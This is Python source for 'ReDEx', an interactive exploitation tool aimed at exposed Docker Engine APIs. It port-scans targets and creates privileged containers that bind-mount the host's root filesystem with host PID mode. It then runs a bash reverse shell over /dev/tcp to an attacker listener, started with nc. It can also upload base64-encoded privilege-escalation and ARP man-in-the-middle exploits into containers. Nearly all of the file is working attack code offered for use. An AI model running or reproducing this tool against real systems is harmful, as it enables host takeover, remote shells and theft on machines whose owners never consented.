import socket
from rich.console  import Console
from rich.prompt   import Prompt
from rich.table    import Table
from rich.progress import Progress
import sys
from typing import Dict, Any, Optional, List
import json
import os
from multiprocessing.pool import ThreadPool
import requests
import time
import subprocess
import threading
from exploits import ExploitDocumentation
import base64


APP_NAME = """

   ▄████████    ▄████████ ████████▄     ▄████████ ▀████    ▐████▀ 
  ███    ███   ███    ███ ███   ▀███   ███    ███   ███▌   ████▀  
  ███    ███   ███    █▀  ███    ███   ███    █▀     ███  ▐███    
 ▄███▄▄▄▄██▀  ▄███▄▄▄     ███    ███  ▄███▄▄▄        ▀███▄███▀    
▀▀███▀▀▀▀▀   ▀▀███▀▀▀     ███    ███ ▀▀███▀▀▀        ████▀██▄     
▀███████████   ███    █▄  ███    ███   ███    █▄    ▐███  ▀███    
  ███    ███   ███    ███ ███   ▄███   ███    ███  ▄███     ███▄  
  ███    ███   ██████████ ████████▀    ██████████ ████       ███▄ 
  ███    ███                                                      

"""

INFO = """
[green]##############################################[/green]
[green]####[/green] [bold red]A Simple Docker Engine API Exploiter[/bold red] [green]####[/green]
[green]##############################################[/green]
"""

BUGS = []

c = Console(color_system="truecolor")

CMD_TYPES = [
    "rvshell",
    "upload"
]

EXPLOITS = {
    "/bash/privesc/mount_host_fs" : ExploitDocumentation.BASH_PRIVESC_MOUNT_HOST_FS,
    "/bash/privesc/ssh_host"      : ExploitDocumentation.BASH_PRIVESC_SSH_HOST,
    "/bash/privesc/pyhttp_inject" : ExploitDocumentation.BASH_PRIVESC_PYHTTP_INJECT,
    "/python/mitm/arp_mitm"       : ExploitDocumentation.PYTHON_MITM_ARP_MITM
}


class Threading:
    @staticmethod
    def threadpool_executor(function, iterable: List[Any], iterable_len: int):
        numer_of_workers = os.cpu_count()
        with ThreadPool(numer_of_workers) as pool, Progress() as prog:
            scan = prog.add_task("Progress", total=iterable_len)
            for loop_index, _ in enumerate(pool.imap(function, iterable), 1):
                prog.update(scan, advance=1.0)

    @staticmethod
    def run_single_thread(function, args: List[Any], daemon: bool=True) -> threading.Thread:
        t = threading.Thread(target=function, args=args, daemon=daemon)
        t.start()
        
        return t


class PortScanner:
    def __init__(self) -> None:
        self.__open_ports = []
        self.__ports = json.load(open("ports.json", mode="r"))

    @staticmethod
    def get_host_ip_addr(host: str) -> Optional[str]:
        try:
            ip = socket.gethostbyname(host)
            return ip
        except socket.gaierror as e:
            c.print(f"Error found: {e}", style="bold red")
            return None

    def scan(self, port: str) -> None:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.settimeout(1.0)
        port = int(port)
        conn_status = sock.connect_ex((self.ip, port))
        if conn_status == 0:
            self.__open_ports.append(port)
        sock.close()

    def show_completion_message(self) -> None:
        if self.__open_ports:
            c.print("Scan Completed. Open Ports: ", style="bold green")
            table = Table(show_header=True, header_style="bold blue")
            table.add_column("PORT", style="green")
            table.add_column("STATE", style="green", justify="center")
            table.add_column("SERVICE", style="green")
            for port in self.__open_ports:
                table.add_row(str(port), "OPEN", self.__ports[str(port)])

            c.print(table)
        else:
            c.print("No Open Ports Found on Target.", style="bold magenta")

    def run(self, host: str) -> bool:
        self.ip = PortScanner.get_host_ip_addr(host)
        if not self.ip:
            return False

        c.print(f"[*] Scanning: [bold blue]{self.ip}[/bold blue]")

        try:
            Threading.threadpool_executor(self.scan, 
                                          self.__ports.keys(), 
                                          len(self.__ports.keys()))
        except KeyboardInterrupt as ke:
            ...
        except Exception as e:
            print(e)
            return False

        self.show_completion_message()

        return True


class ReverShellHandler:
    def __init__(self, lhost: str, lport: int) -> None:
        c.print(f"[*] Started Reverse Shell Handler on {lhost}:{lport} ... ")

        self.__lhost = lhost
        self.__lport = lport

    def handle_rv(self, exec_start: Dict[str, bool], addr: str, exec_id: str) -> None:
        try:
            remote_shell_process = Threading.run_single_thread(
                function=subprocess.run,
                args=(['/bin/bash', '-c', f'nc -lvp {self.__lport}'], )
            )
            response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=exec_start)
        except KeyboardInterrupt:
            ...

        c.print(f"[*] Connection Closing ... ", style="yellow")


class Command:
    def __init__(self, name: str, desc: str, cmd: str, info: str="") -> None:
        self.__name = name
        self.__desc = desc
        self.__cmd  = cmd
        self.__info = info
    
    def __str__(self) -> str:
        return f"COMMAND: {self.__name} - {self.__desc}\n" +\
               f"         Usage: {self.__cmd}\n" + \
               (f"         Info: {self.__info}\n" if self.__info else "")


class Commands:
    CMDS = {
        "help"     : Command(name="help",
                             desc="Show all commands of EscapeDocker",
                             cmd="help"),
        "set"      : Command(name="set",
                             desc="Set the value of a variable",
                             cmd="set VAR=VALUE",
                             info="For JSON variable must be used 'setdata"),
        "show"     : Command(name="show",
                             desc="Show the value of a variable",
                             cmd="show [VAR1, ...]",
                             info="If no VAR given, show the value of every variable"),
        "clear"    : Command(name="clear",
                             desc="Clear the screen",
                             cmd="clear"),
        "quit"     : Command(name="quit",
                             desc="Quit the application",
                             cmd="quit"),
        "setdata"  : Command(name="setdata",
                             desc="Set the value for a JSON variable from a JSON file",
                             cmd="setdata VAR=JSONfile"),
        "scan"     : Command(name="scan",
                             desc="Scan a specified IP looking for open ports",
                             cmd="scan",
                             info="The scanned IP is the one setted previously"),
        "lstimgs"  : Command(name="lstimgs",
                             desc="List all images of a remote host",
                             cmd="lstimgs [filters=[VAL1[:TAG],...]]"),
        "pull"     : Command(name="pull",
                             desc="Pull an given image on the remote host",
                             cmd="pull",
                             info="The pulled image is defined in the variable IMAGE"),
        "create"   : Command(name="create",
                             desc="Create a container in a remote host",
                             cmd="create",
                             info="Container created with data in variable DATA"),
        "start"    : Command(name="start",
                             desc="Start a container",
                             cmd="start",
                             info="The container that should be started is the one with name NAME"),
        "stop"     : Command(name="stop",
                             desc="Stop a container",
                             cmd="stop",
                             info="Stop the container identified with name NAME"),
        "execute"  : Command(name="execute",
                             desc="Execute a command inside a running container (default=rvshell)",
                             cmd="execute [command=COMMAND]",
                             info="COMMAND can be one between [" + ", ".join(CMD_TYPES) + "] or your own"),
        "lstconts" : Command(name="lstconts",
                             desc="List all containers of a remote host",
                             cmd="lstconts [all] [imgs=[IMG1,...]] [nets=[NET1, ...]] [status=STATUS]",
                             info="If no parameter is passed than it will show only running containers\n" + 
                             " " * 15 + "- imgs filters containers by given images\n" + 
                             " " * 15 + "- nets fitlers containers by given networks\n" + 
                             " " * 15 + "- status filters containers by a given status. Possible status are\n" + 
                             " " * 15 + "      + created\n" + 
                             " " * 15 + "      + restarting\n" + 
                             " " * 15 + "      + running\n" + 
                             " " * 15 + "      + removing\n" + 
                             " " * 15 + "      + paused\n" + 
                             " " * 15 + "      + exited\n" +
                             " " * 15 + "      + dead\n"),
        "remove"   : Command(name="remove",
                             desc="Remove one or more containers",
                             cmd="remove [names=[NAME1, ...]]",
                             info="If no name given, remove the one named with NAME"),
        "inspect"  : Command(name="inspect",
                             desc="Inspect a specific container",
                             cmd="inspect [name=NAME]",
                             info="If not name given inspect the container named with NAME"),
        "upload"   : Command(name="upload",
                             desc="Upload a file inside a container",
                             cmd="Upload",
                             info="Upload what is defined in the variable EXPLOIT"),
        "use"      : Command(name="use",
                             desc="Select which file/exploit to use for Uploading or other things",
                             cmd="use [exploit=[FILE|EXPLOIT_NAME]]",
                             info="Set the value for EXPLOIT. Default available Exploits are: \n" +
                             "\n".join([" " * 15 + f"- {k}" for k in EXPLOITS.keys()]))
    }

    @classmethod
    def print(cls, *args) -> None:
        cmds = {cmd : cls.CMDS[cmd] for cmd in args if cmd in cls.CMDS} if args else cls.CMDS
        for _, v in cmds.items():
            c.print(v)


class RemoteDockerExecution:
    def __init__(self, ) -> None:
        c.print(APP_NAME, style="bold yellow", justify="center")
        c.print("[u]Welcome to Remote Docker Execution - ReDEx v1.0.0[/u]\n", 
                style="purple", 
                justify="center"
        )
        c.print(INFO + "\n\n", justify="center")
        if len(BUGS) > 0:
            c.print("Bugs that needs to be fixed:\n" + "".join(BUGS) + "\n\n")

        self.__rhost        = "0.0.0.0"
        self.__rport        = 2375
        self.__name         = "container"
        self.__image        = "ubuntu:latest"
        self.__lhost        = "0.0.0.0"
        self.__lport        = 4444
        self.__privileged   = True
        self.__autoremove   = True
        self.__networkdisab = False
        self.__command      = "rvshell"
        self.__exploit      = "/bash/privesc/mount_host_fs"
        self.__exposedports = dict()
        self.__networkmode  = "bridge"
        self.__pidmode      = "host"
        self.__data  = {
            "create" : {
                "Image" : self.__image, "HostConfig" : {
                    "Privileged": self.__privileged,
                    "AutoRemove": self.__autoremove,
                    "Mounts" : [{
                        "Target": "/mnt/fs",
                        "Source": "/",
                        "Type": "bind",
                        "ReadOnly": False,
                    }],
                    "NetworkMode" : self.__networkmode,
                    "PidMode" : self.__pidmode,
                    "PortBindings" : dict()
                },
                "NetworkDisabled" : self.__networkdisab,
                "Entrypoint": ["tail", "-f", "/dev/null"],
                "OpenStdin" : True,
                "ExposedPorts" : self.__exposedports
            },
            "exec" : {
                "Cmd" : [
                    "/bin/bash", "-c", 
                    "{:s}"
                ],
                "AttachStdin" : True,
                "AttachStdout" : True,
                "AttachStderr" : True,
                "Tty" : True,
                "Privileged": True
            },
            "exec_start" : {
                "Tty" : True
            }
        }

        self.exec_created = False
        self.command_types = {
            "rvshell" : 'bash -i >& /dev/tcp/{:s}/{:d} 0>&1',
            "upload"  : 'echo {:s} | base64 -d >> file{:s}'
        }
        self.printable_exploit = "/" + "/".join(self.__exploit.split("/")[-2:])

    @staticmethod
    def merge_args(args: List[str]) -> List[str]:
        outputs = []
        old = ""

        for el in args:
            if "=" in el:
                if old != "":
                    outputs.append(old.strip())

                old = el
                continue
            
            old += " " + el

        outputs.append(old.strip())
        return outputs

    @staticmethod
    def extrapolate_informations_from_json(data: Dict[str, Any]) -> Dict[str, Any]:
        # Takes general informations
        container_id = data["Id"]
        container_name = data["Names"][0]
        base_image = data["Image"]
        command = data["Command"]
        state = data["State"]

        # Takes exposed ports
        _available_ports = data["Ports"]
        ports = {"Ports": []}
        for port in _available_ports:
            ip = "" if "IP" not in port else port["IP"]
            priv_port = "" if "PrivatePort" not in port else port["PrivatePort"]
            publ_port = "" if "PublicPort" not in port else port["PublicPort"]
            port_str = f"{publ_port} -> {priv_port}(type={port['Type']},ip={ip})"
            ports["Ports"].append(port_str)

        # Takes labels
        _available_labels = data["Labels"]
        labels = {"Labels": []}
        for k, v in _available_labels.items():
            label_str = f"{k.split('.')[-1]}={v}"
            labels["Labels"].append(label_str)

        # Takes network settings
        _available_networks = data["NetworkSettings"]["Networks"]
        networks = dict()
        for net_k, net_v in _available_networks.items():
            networks[net_k] = {}
            networks[net_k]["NetworkID"] = net_v["NetworkID"]
            networks[net_k]["EndpointID"] = net_v["EndpointID"]
            networks[net_k]["Gateway"] = net_v["Gateway"]
            networks[net_k]["IPAddress"] = net_v["IPAddress"]
            networks[net_k]["MacAddress"] = net_v["MacAddress"]

        # Takes mount points
        _available_mount_points = data["Mounts"]
        mounts = {"Mounts": []}
        for mount in _available_mount_points:
            mount_str = f"{mount['Source']} -> {mount['Destination']}(type={mount['Type']})"
            mounts["Mounts"].append(mount_str)

        return {
            "Id"       : container_id,
            "Name"     : container_name,
            "Image"    : base_image,
            "Command"  : command,
            "State"    : state,
            "Ports"    : ports["Ports"],
            "Labels"   : labels["Labels"],
            "Networks" : networks,
            "Mounts"   : mounts["Mounts"]
        }

    def setvalue(self, *args) -> None:
        name_class = self.__class__.__name__
        sets       = [tuple(v.split("=")) for v in args] 
        
        # Set values
        for var, val in sets:
            attr = f"_{name_class}__{var.lower()}"
            if val.isnumeric():
                val = int(val)

            if var == "EXPLOIT":
                continue

            setattr(self, attr, val)
            c.print(f"[*] Setting {var} => {val}")

    def show(self, *args) -> None:
        for k, v in self.__dict__.items():
            if not k.startswith(f"_{self.__class__.__name__}"):
                continue

            k = k.split("_")[-1].upper()

            if isinstance(v, dict):
                c.print("%s =" % k)
                c.print(v)
                
                continue

            c.print(f"{k} = {v} (type={type(v)})")

    def quit(self, *args) -> None:
        c.print("\n[*] Quitting ... ", style="bold red")
        sys.exit(1)

    def setdata(self, *args) -> None:
        name_class = self.__class__.__name__
        sets       = [tuple(v.split("=")) for v in args]

        for var, filename in sets:
            data = json.load(open(filename, mode="r"))
            attr = f"_{name_class}__{var.lower()}"

            setattr(self, attr, data)

    def scan(self, *args) -> None:
        ps = PortScanner()
        ps.run(self.__rhost)

    def list_imgs(self, *args) -> None:
        response = requests.get(f"http://{self.__rhost}:{self.__rport}/images/json")
        f_dicts  = dict()

        if len(args) > 0:
            filters = args[0].split("=")[-1].split(",")
            filters = [(f"{f}:latest" if ":" not in f else ":".join(f.split(":"))) for f in filters]
            f_dicts = {f: False for f in filters}
        else:
            filters = []

        for data in response.json():
            for f in filters:
                if f in data["RepoTags"]:
                    f_dicts[f] = True
                    break

            if len(filters) == 0:
                f_dicts[data["RepoTags"][0]] = True

        c.print(f_dicts)
        return f_dicts

    def connect(self, sock: socket.socket) -> bool:
        try:
            sock.connect((self.__rhost,self.__rport))
            return True
        except socket.gaierror:
            return False

    def pull(self, *args) -> None:
        image = self.__image if ":" in self.__image else f"{self.__image}:latest"
        self.__image = image
        request = f"POST /images/create?fromImage={image} HTTP/1.1\r\n" + \
                  f"Host:{self.__rhost}:{self.__rport}\r\n\r\n" +         \
                   "Content-Type: application/json\r\n"

        enc_req = request.encode()
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        connected = self.connect(sock)

        if not connected:
            return None

        try:
            sock.send(enc_req)


            response = sock.recvmsg(4096)
            progress = json.loads(response[0].decode().split("\r\n")[10])

            while "Downloaded" not in progress['status']:
                response = sock.recvmsg(4096)
                progress = json.loads(response[0].decode().split("\r\n")[1])

                if "progress" in progress:
                    c.print(f"[*] Pulling: [magenta]{progress['progress']}[/magenta]", end="\r")
            
            print("\n")
        except BrokenPipeError as bp:
            c.print("[*] Command failed!", style="bold red")

        sock.close()

    def create(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        query = f"name={self.__name}"
        response = requests.post(f"http://{addr}/containers/create?{query}", 
                                 json=self.__data['create']
        )

        if response.status_code != 201:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception

        c.print(f"[*] [green]Container Created[/green] ID: {response.json()['Id']}")

    def start(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        response = requests.post(f"http://{addr}/containers/{self.__name}/start")
        if response.status_code != 204:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception
        
        c.print(f"[*] [green]Container {self.__name.upper()} Has stated[/green]")

    def stop(self, *args) -> None:
        addr  = f"{self.__rhost}:{self.__rport}"
        response = requests.post(f"http://{addr}/containers/{self.__name}/stop")
        if response.status_code != 204:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception
        
        c.print(f"[*] [green]Container {self.__name.upper()} Has been stopped[/green]")

    def cexec(self, *args) -> None:
        addr    = f"{self.__rhost}:{self.__rport}"
        command = self.__command
        arg    = []
        
        if command == "rvshell":
            arg = [self.__lhost, self.__lport]
        elif command == "upload":
            arg = [args[0], args[1]]
        
        if command in self.command_types:
            cmd = self.command_types[command].format(*arg)
        else:
            cmd = command

        data = self.__data["exec"]
        data["Cmd"][2] = f'{cmd}'

        c.print(f"[*] Executing command: [yellow]'{cmd}'[/yellow]")
        
        response = requests.post(f"http://{addr}/containers/{self.__name}/exec", json=data)
        if response.status_code != 201:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception

        exec_id = response.json()["Id"]
        c.print(f"[*] [green]Exec instance created with ID[/green]: \n{exec_id}")

        if command == "rvshell":
            try:
                rvshell = ReverShellHandler(self.__lhost, self.__lport)
                rvshell.handle_rv(self.__data["exec_start"], addr, exec_id)
                return None
            except Exception as e:
                print(e)

        response = requests.post(f"http://{addr}/exec/{exec_id}/start", json=self.__data["exec_start"])
        if response.status_code != 200:
            c.print(f"[*] [red]Error: {response.text}[/red]")
            raise Exception

        c.print("[*] [green]Result[/green]")
        c.print(response.text)

        return None

    def list_containers(self, *args) -> None:
        show_all = False
        filters  = dict()
        args     = list(args)

        if "all" in args:
            show_all = True
            args.remove("all")

        maps = {"imgs" : "ancestor", "nets" : "network", "status": "status"}

        for arg in args:
            name, filts = arg.split("=")
            if name not in maps:
                c.print(f"[red]No argument with name: {name}")
                raise KeyError

            real_name = maps[name]
            filters[real_name] = filts.split(",")

        addr = f"{self.__rhost}:{self.__rport}"
        params = {
            "all" : show_all,
            "filters" : json.dumps(filters)
        }
        response = requests.get(f"http://{addr}/containers/json", params=params)
        if response.status_code != 200:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception

        containers = response.json()
        if not containers:
            c.print(f"[*] [yellow]Empty Result[/yellow]")
            return
        
        contents = {}
        try:
            for container in containers:
                infos = RemoteDockerExecution.extrapolate_informations_from_json(container)
                contents[infos["Name"]] = infos
                
            c.print(contents)
        except KeyError as ke:
            print(ke)

    def remove(self, *args) -> None:
        if len(args) > 0:
            names = list(args)[0].split("=")[-1].split(",")
        else:
            names = [self.__name]
        
        addr = f"{self.__rhost}:{self.__rport}"
        for name in names:
            response = requests.delete(f"http://{addr}/containers/{name}?v=true&force=true")
            if response.status_code != 204:
                c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
                raise Exception
            
            c.print(f"[*] [green]Removed container {name}[/green]")

    def inspect(self, *args) -> None:
        if len(args) > 0:
            name = list(args)[0].split("=")[1]
        else:
            name = self.__name

        addr = f"{self.__rhost}:{self.__rport}"
        response = requests.get(f"http://{addr}/containers/{name}/json")
        if response.status_code != 200:
            c.print(f"[*] [red]Error: {response.json()['message']}[/red]")
            raise Exception
        
        c.print(response.json())

    def upload(self, *args) -> None:
        old_command = self.__command
        self.__command = "upload"
        exploit = self.__exploit
        if exploit in EXPLOITS:
            ext = EXPLOITS[exploit].ext
            exploit = EXPLOITS[exploit].path
        else:
            exp_name = exploit.split("/")[-1]
            ext = exp_name[len(exp_name):]
        
        exploit = base64.b64encode(open(exploit, mode="r").read().encode('ascii')).decode('ascii')

        self.cexec(exploit, ext)
        self.__command = old_command

    def use(self, *args) -> None:
        if len(args) > 0:
            self.__exploit = args[0].split("=")[1]
        else:
            c.print(f"[*] [red]The 'use' command requires an argument[/red]")
            raise Exception
        
        c.print(f"[*] [green]EXPLOIT => {self.__exploit}[/green]")
        self.printable_exploit = "/" + "/".join(self.__exploit.split("/")[-2:])

    def run(self) -> None:
        maps = {
            "help"     : Commands().print,
            "clear"    : c.clear,
            "set"      : self.setvalue,
            "quit"     : self.quit,
            "show"     : self.show,
            "scan"     : self.scan,
            "setdata"  : self.setdata,
            "lstimgs"  : self.list_imgs,
            "pull"     : self.pull,
            "create"   : self.create,
            "start"    : self.start,
            "stop"     : self.stop,
            "execute"  : self.cexec,
            "lstconts" : self.list_containers,
            "remove"   : self.remove,
            "inspect"  : self.inspect,
            "upload"   : self.upload,
            "use"      : self.use
        }

        while True:
            try:
                if self.__rhost != "0.0.0.0":
                    command = self.__command if self.__command in self.command_types else "custom"
                    msg = f"([blue]{command}[/blue]:[red]{self.printable_exploit}[/red])"
                else:
                    msg = ""

                cmd = Prompt.ask(f">>> {msg}")

                # Take the name of the command
                splitte_cmd = cmd.split()
                if len(splitte_cmd) > 1:
                    name, args = splitte_cmd[0], RemoteDockerExecution.merge_args(splitte_cmd[1:])
                    maps[name](*args)
                    continue
                
                name = splitte_cmd[0]
                maps[name]()
            except KeyboardInterrupt as ki:
                self.quit()
            except KeyError as ke:
                c.print(f"Command '{cmd}' does not exists!!", style="bold yellow")
            except Exception as e:
                print(e)
                c.print(f"Command Failed!", style="bold red")


if __name__ == "__main__":
    rde = RemoteDockerExecution()
    rde.run()
